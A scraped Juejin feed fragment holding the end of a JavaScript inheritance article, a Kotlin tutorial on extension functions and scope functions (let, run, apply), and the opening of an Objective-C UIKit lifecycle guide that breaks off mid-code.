<table><thead><tr><th>继承方式</th><th>是否继承构造函数属性</th><th>是否继承原型方法</th><th>是否污染父类</th><th>是否推荐</th></tr></thead><tbody><tr><td>构造函数绑定（call）</td><td>✅</td><td>❌</td><td>❌</td><td>部分场景</td></tr><tr><td>原型链继承</td><td>✅（但有副作用）</td><td>✅</td><td>❌</td><td>不推荐</td></tr><tr><td>直接共享原型</td><td>❌</td><td>✅</td><td>✅（严重）</td><td>禁止</td></tr><tr><td><strong>Object.create 中介</strong></td><td>✅（配合 call）</td><td>✅</td><td>❌</td><td><strong>✅ 推荐</strong></td></tr></tbody></table>
<p>而 <code>instanceof</code> 的本质，始终是<strong>在原型链上查找 <code>B.prototype</code> 是否出现</strong>。理解这一点，就能轻松应对各种继承场景下的类型判断。</p>
<p>在大型项目中，清晰的继承结构和正确的 <code>instanceof</code> 使用，能极大提升代码的可维护性和协作效率。希望本文能帮你夯实基础，在掘金社区写出更高质量的前端文章！</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[七、Kotlin——扩展（Extensions）]]></title>    <link>https://juejin.cn/post/7579917791764955163</link>    <guid>https://juejin.cn/post/7579917791764955163</guid>    <pubDate>2025-12-05T03:54:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579917791764955163" data-draft-id="7579872561675714569" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="七、Kotlin——扩展（Extensions）"/> <meta itemprop="keywords" content="Android,Kotlin"/> <meta itemprop="datePublished" content="2025-12-05T03:54:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Haha_bj"/> <meta itemprop="url" content="https://juejin.cn/user/2612027844214647"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            七、Kotlin——扩展（Extensions）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612027844214647/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Haha_bj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:54:51.000Z" title="Fri Dec 05 2025 03:54:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Kotlin 能够扩展一个类的新功能而无需继承该类。 例如，你可以为一个你不能修改的来自第三方库中的类编写一个新的函数。 这个新增的函数就像那个原始类本来就有的函数一样，可以用普通的方法调用。 这种机制称为 扩展函数 。此外，也有 扩展属性， 允许你为一个已经存在的类添加新的属性。</p>
<p>在Kotlin中提供了大量的扩展，使得我们的代码更加简洁，开发出来的框架更加易用</p>
<h2 data-id="heading-0">一、扩展方法的使用</h2>
<p>Kotlin的扩展函数可以让你作为一个类成员进行调用的函数。这样可以很方便的扩展一个已经存在的类，为它添加额外的方法。在Kotin源码中，有大量的扩展函数来扩展Java，这样使得Kotlin比Java更方便使用，效率更高。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f7fe90cf263648fb9699f5df8d3c278c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFoYV9iag==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765511691&amp;x-signature=BxglX2uthmeOn4HPZQzLUgdkwNM%3D" alt="图片.png" loading="lazy"/></p>
<ul>
<li>在Kotlin中使用</li>
</ul>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Jump</span>{
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>{
        println(<span class="hljs-string">"jump test"</span>)
        <span class="hljs-comment">// 在被扩展的类中使用</span>
        doubleJump(<span class="hljs-number">1f</span>)
    }
}
<span class="hljs-comment">// 扩展方法的定义，就是在方法的前面加上类前缀</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> Jump.<span class="hljs-title">doubleJump</span><span class="hljs-params">(value: <span class="hljs-type">Float</span>)</span></span> : <span class="hljs-built_in">Boolean</span>{
    println(<span class="hljs-string">"value = <span class="hljs-variable">$value</span>"</span>)
    <span class="hljs-keyword">return</span>  <span class="hljs-literal">true</span>
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// 使用对象调用</span>
    <span class="hljs-keyword">val</span>  ju = Jump()
    <span class="hljs-comment">/// 外部调用 扩展</span>
    ju.doubleJump(<span class="hljs-number">2f</span>)
}
</code></pre>
<ul>
<li>在Java中使用</li>
</ul>

<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaLession</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-comment">///  在Java中调用 Kotlin 的扩展</span>
        <span class="hljs-title class_">Lesson04Kt</span>.<span class="hljs-title function_">doubleJump</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Jump</span>(),1f)
    }
}
</code></pre>
<h2 data-id="heading-1">二、泛型扩展方法</h2>
<p>为了考虑到扩展函数的通用性，我们可以借助上面课程中学习到的泛型，来为扩展方法进行泛型化改造以 fun MutableList Int.swap(index1:Int，index2:Int)为例，接下来我们为它进行泛型化改造</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> MutableList<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">jl_swap</span><span class="hljs-params">(index1: <span class="hljs-type">Int</span>, index2: <span class="hljs-type">Int</span>)</span></span>{
    <span class="hljs-keyword">var</span>  tmp = <span class="hljs-keyword">this</span>[index1]
    <span class="hljs-keyword">this</span>[index1] = <span class="hljs-keyword">this</span>[index2]
    <span class="hljs-keyword">this</span>[index2] = tmp
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> test2 = mutableListOf(<span class="hljs-string">"Android o"</span>,<span class="hljs-string">"Android N"</span>, <span class="hljs-string">"Android M"</span>)
    test2.jl_swap(<span class="hljs-number">3</span>,<span class="hljs-number">5</span>)
}
</code></pre>
<h2 data-id="heading-2">三、为伴生对象添加扩展</h2>
<p>如果一个类定义了伴生对象，那么我们也可以为伴生对象定义扩展函数与属性:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span>  <span class="hljs-title class_">Jump</span>{
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span>{
    }
}
<span class="hljs-function"><span class="hljs-keyword">fun</span> Jump.Companion.<span class="hljs-title">run</span><span class="hljs-params">(str: <span class="hljs-type">String</span>)</span></span>{
    println(str)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    Jump.run(<span class="hljs-string">"aa"</span>)
}
</code></pre>
<h2 data-id="heading-3">四、Kotlin中常用的扩展</h2>
<p>在Kotlin的源码中定义了大量的扩展，比如: let，run ,apply ，了解并运用这些函数能帮我们提高编码效率。</p>
<p><code>- let扩展</code>let扩展函数的实际上是一个作用域函数，当你需要去定义一个变量在一个特定的作用域范围内，那么let函数是一个不错的选择;let函数另一个作用就是可以避免写一些判断null的操作。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// let扩展函数，类后面加上?代表参数可能为空，使用的时候注意判空</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testLet</span><span class="hljs-params">(str: <span class="hljs-type">String</span>?)</span></span>{
    str.let {
        <span class="hljs-keyword">var</span> str2 = <span class="hljs-string">"let 扩展"</span>
        println(it + str2)
    }
    <span class="hljs-comment">// str2 外部无法访问</span>

    <span class="hljs-comment">// 判空用法，当str为空，则不会触发闭包里面的逻辑</span>
    str?.let {
        println(it.length)
    }

}
</code></pre>
<p><code>- run扩展</code>
run函数只接收子个lambda函数为参数，以闭包形式返回，返回值为最后一行的值或者指定的return的表达式，在run函数中可以直接访问实例的公有属性和方法。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 返回值为最后一行的值或者指定的return的表达式，在run函数中可以直接访问实例的公有属性和方法。</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span>  <span class="hljs-title">testRun</span><span class="hljs-params">(jump: <span class="hljs-type">Jump</span>)</span></span>: String{
    jump.run {
        test()
        println(<span class="hljs-string">"ddd"</span>)
        <span class="hljs-keyword">return</span>  <span class="hljs-string">"222"</span>
    }
}
</code></pre>
<p><code>- apply扩展</code>apply函数的作用是:调用某对象的apply函数，在函数范围内，可以任意调用该对象的任意方法，并返回该对象。
从结构上来看apply函数和run函数很像，唯一不同点就是它们各自返回的值不一样，run函数是以闭包形式返回最后一行代码的值，而apply函数的返回的是传入对象的本身。</p>
<p>apply一般用于一个对象实例初始化的时候，需要对对象中的属性进行赋值。或者动态inflate出一个XML的View的时候需要给View绑定数据也会用到，这种情景非常常见。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// apply函数的作用是:调用某对象的apply函数，在函数范围内，可以任意调用该对象的任意方法，并返回该对象。</span>
    <span class="hljs-comment">// 从结构上来看apply函数和run函数很像，唯一不同点就是它们各自返回的值不一样，run函数是以闭包形式返回最后一行代码的值,</span>
    ArrayList&lt;String&gt;().apply {
        add(<span class="hljs-string">"dd"</span>)
        add(<span class="hljs-string">"333"</span>)
    }.run {
        <span class="hljs-keyword">for</span> (s <span class="hljs-keyword">in</span> <span class="hljs-keyword">this</span>){
            println(s)
        }
    }

}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[IOS UIKit 相关知识]]></title>    <link>https://juejin.cn/post/7579921879973150766</link>    <guid>https://juejin.cn/post/7579921879973150766</guid>    <pubDate>2025-12-05T03:58:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579921879973150766" data-draft-id="7579904059525955610" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="IOS UIKit 相关知识"/> <meta itemprop="keywords" content="iOS"/> <meta itemprop="datePublished" content="2025-12-05T03:58:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="如此风景"/> <meta itemprop="url" content="https://juejin.cn/user/342703355996926"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            IOS UIKit 相关知识
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/342703355996926/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    如此风景
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:58:17.000Z" title="Fri Dec 05 2025 03:58:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">iOS UIKit 全体系知识手册（Objective-C 版）</h2>
<p>UIKit 是 iOS/iPadOS 开发的<strong>核心 UI 框架</strong>，基于 Objective-C 构建，封装了所有可视化界面、交互、布局、渲染相关的能力，是构建 iOS 应用的基础。以下从「基础架构→核心组件→布局→事件→渲染→适配→优化→调试」全维度拆解 UIKit 知识体系，覆盖开发全场景。</p>
<h3 data-id="heading-1">一、UIKit 基础核心（框架基石）</h3>
<h4 data-id="heading-2">1. UIKit 定位与依赖</h4>
<ul>
<li>
<p><strong>核心作用</strong>：提供 iOS 应用的可视化界面、用户交互、布局管理、事件处理等能力，是上层业务与底层系统（Core Graphics/Core Animation/Foundation）的桥梁。</p>
</li>
<li>
<p><strong>依赖关系</strong>：</p>
</li>
</ul>
<p>  - 基于 <code>Foundation</code>（数据处理：NSString/NSDictionary 等）；</p>
<p>  - 依赖 <code>Core Graphics</code>（绘图）、<code>Core Animation</code>（动画/渲染）、<code>Core Text</code>（文本排版）；</p>
<p>  - 兼容 <code>AppKit</code>（macOS）部分逻辑，但针对移动设备做了轻量化适配。</p>
<ul>
<li>
<p><strong>核心设计思想</strong>：基于「响应者链」+「MVC 架构」，视图（UIView）负责展示，控制器（UIViewController）负责逻辑，模型（Model）负责数据。</p>
</li>
</ul>
<h4 data-id="heading-3">2. 应用入口与生命周期</h4>
<h5 data-id="heading-4">（1）应用级入口（UIApplication）</h5>
<p><code>UIApplication</code> 是应用的「单例管家」，管理应用生命周期、事件分发、状态栏、URL 跳转等：</p>
<pre><code class="hljs language-objc" lang="objc">
<span class="hljs-comment">// 获取应用单例</span>

<span class="hljs-built_in">UIApplication</span> *app = [<span class="hljs-built_in">UIApplication</span> sharedApplication];

<span class="hljs-comment">// 设置状态栏样式（iOS 13+ 需在 Info.plist 配置 View controller-based status bar appearance = NO）</span>

app.statusBarStyle = <span class="hljs-built_in">UIStatusBarStyleLightContent</span>;

<span class="hljs-comment">// 打开URL</span>

[app openURL:[<span class="hljs-built_in">NSURL</span> URLWithString:<span class="hljs-string">@"https://www.apple.com"</span>] options:@{} completionHandler:<span class="hljs-literal">nil</span>];

</code></pre>
<h5 data-id="heading-5">（2）应用代理（UIApplicationDelegate / SceneDelegate）</h5>
<ul>
<li>
<p><strong>iOS 12 及以下</strong>：通过 <code>UIApplicationDelegate</code> 管理应用生命周期（全局唯一）；</p>
</li>
<li>
<p><strong>iOS 13+</strong>：引入 <code>UISceneDelegate</code> 管理「场景（Scene）」生命周期（支持多窗口），<code>UIApplicationDelegate</code> 仅负责应用级初始化。</p>
</li>
</ul>

































<table><thead><tr><th>核心生命周期方法（UIApplicationDelegate）</th><th>说明</th></tr></thead><tbody><tr><td><code>application:didFinishLaunchingWithOptions:</code></td><td>应用启动完成（初始化根控制器）</td></tr><tr><td><code>applicationDidBecomeActive:</code>             </td><td>应用进入前台（可交互）</td></tr><tr><td><code>applicationWillResignActive:</code>             </td><td>应用退至后台（如来电、下拉通知）</td></tr><tr><td><code>applicationDidEnterBackground:</code>           </td><td>应用完全后台（需保存数据）</td></tr><tr><td><code>applicationWillEnterForeground:</code>          </td><td>应用即将前台（恢复界面）</td></tr><tr><td><code>applicationWillTerminate:</code>                </td><td>应用即将退出（最后清理）</td></tr></tbody></table>
<h5 data-id="heading-6">（3）UIViewController 生命周期（核心）</h5>
<p>控制器是「视图的管理者」，其生命周期决定了视图的创建/销毁，OC 核心方法如下：</p>
<pre><code class="hljs language-objc" lang="objc">
<span class="hljs-class"><span class="hljs-keyword">@interface</span> <span class="hljs-title">ViewController</span> ()</span>
<span class="hljs-keyword">@end</span>

<span class="hljs-class"><span class="hljs-keyword">@implementation</span> <span class="hljs-title">ViewController</span></span>

<span class="hljs-comment">// 1. 初始化（代码创建时调用）</span>

- (<span class="hljs-keyword">instancetype</span>)initWithNibName:(<span class="hljs-built_in">NSString</span> *)nibNameOrNil bundle:(<span class="hljs-built_in">NSBundle</span> *)nibBundleOrNil {

    <span class="hljs-keyword">self</span> = [<span class="hljs-variable language_">super</span> initWithNibName:nibNameOrNil bundle:nibBundleOrNil];

    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">self</span>) {

        <span class="hljs-comment">// 初始化数据、配置</span>

    }

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>;

}

<span class="hljs-comment">// 2. 加载视图（视图首次创建，懒加载）</span>

- (<span class="hljs-type">void</span>)loadView {

    <span class="hljs-comment">// 手动创建根视图（若不用XIB/Storyboard）</span>

    <span class="hljs-keyword">self</span>.view = [[<span class="hljs-built_in">UIView</span> alloc] initWithFrame:[<span class="hljs-built_in">UIScreen</span> mainScreen].bounds];

    <span class="hljs-keyword">self</span>.view.backgroundColor = [<span class="hljs-built_in">UIColor</span> whiteColor];

}

<span class="hljs-comment">// 3. 视图加载完成（初始化控件、布局）</span>

- (<span class="hljs-type">void</span>)viewDidLoad {

    [<span class="hljs-variable language_">super</span> viewDidLoad];

    <span class="hljs-comment">// 核心初始化逻辑（仅执行一次）</span>

}

<span class="hljs-comment">// 4. 视图即将显示（每次显示前调用，如跳转返回）</span>

- (<span class="hljs-type">void</span>)viewWillAppear:(<span class="hljs-type">BOOL</span>)animated {

    [<span class="hljs-variable language_">super</span> viewWillAppear:animated];

    <span class="hljs-comment">// 更新界面数据、刷新布局</span>

}

<span class="hljs-comment">// 5. 视图已显示（可执行动画、网络请求）</span>

- (<span class="hljs-type">void</span>)viewDidAppear:(<span class="hljs-type">BOOL</span>)animated {

    [<span class="hljs-variable language_">super</span> viewDidAppear:animated];

}
<span class="hljs-comment">// 6. 视图即将隐藏</span>

- (<span class="hljs-type">void</span>)viewWillDisappear:(<span class="hljs-type">BOOL</span>)animated {

    [<span class="hljs-variable language_">super</span> viewWillDisappear:animated];

    <span class="hljs-comment">// 暂停动画、移除监听</span>

}

<span class="hljs-comment">// 7. 视图已隐藏</span>

- (<span class="hljs-type">void</span>)viewDidDisappear:(<span class="hljs-type">BOOL</span>)animated {

    [<span class="hljs-variable language_">super</span> viewDidDisappear:animated];

}

<span class="hljs-comment">// 8. 内存警告（释放非必要资源）</span>

- (<span class="hljs-type">void</span>)didReceiveMemoryWarning {

    [<span class="hljs-variable language_">super</span> didReceiveMemoryWarning];

}

<span class="hljs-comment">// 9. 视图销毁（控制器释放前）</span>

- (<span class="hljs-type">void</span>)dealloc {

